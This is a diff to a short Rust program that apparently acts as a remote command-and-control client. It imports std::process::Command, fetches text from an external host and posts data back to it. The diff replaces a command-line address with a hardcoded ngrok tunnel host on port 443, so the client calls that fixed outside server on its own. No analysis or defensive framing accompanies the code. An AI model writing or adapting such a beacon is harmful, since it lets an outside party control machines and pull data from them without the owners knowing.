@@ -3,16 +3,17 @@ use std::process::Command;
 use std::str;
 
 static PROTO: &str = "https";
-fn addr() -> Vec<String> {
-        env::args().collect()
-}
+static ADDR: &str = "9023-2814-1b94-6bc-c000-83ec-fc77-ba8f-55db.ngrok-free.app";
+//fn addr() -> Vec<String> {
+//        env::args().collect()
+//}
 static PORT: u32 = 443;
 
 #[tokio::main]
 
 async fn res() -> String{
-    let ngrok = addr();
-    let url = format!("{}://{}:{}", PROTO, ngrok[1], PORT);
+    //let ngrok = addr();
+    let url = format!("{}://{}:{}", PROTO, ADDR, PORT); //ngrok[1]
     match reqwest::get(url).await{
         Ok(_res) =>{
             let res = _res.text().await.unwrap();
@@ -24,8 +25,8 @@ async fn res() -> String{
     }
 }
 fn req(data: &str){
-    let ngrok = addr();
-    let url = format!("{}://{}:{}", PROTO, ngrok[1], PORT);
+    //let ngrok = addr();
+    let url = format!("{}://{}:{}", PROTO, ADDR, PORT); //ngrok[1]
     let body = format!("{}", data);
     let client = reqwest::blocking::Client::new();
     match client.post(url).body(body).send() {
